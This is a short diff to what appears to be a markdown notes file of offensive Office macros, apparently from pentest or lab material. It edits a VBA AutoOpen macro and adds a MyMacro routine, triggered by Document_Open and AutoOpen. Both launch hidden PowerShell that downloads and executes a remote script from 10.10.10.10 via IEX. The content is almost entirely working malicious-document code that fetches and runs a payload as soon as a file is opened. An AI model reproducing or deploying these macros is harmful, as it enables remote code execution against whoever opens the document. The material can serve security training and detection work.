@@ -38,8 +38,24 @@ Sub AutoOpen()
 
   Dim Shell As Object
   Set Shell = CreateObject("wscript.shell")
-  shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/a'))"""
+  shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/a.ps1'))"""
 
+End Sub
+```
+
+```vb
+Sub MyMacro()
+    Dim str As String
+    str = "powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/a.ps1')"
+    Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
 End Sub
 ```
 
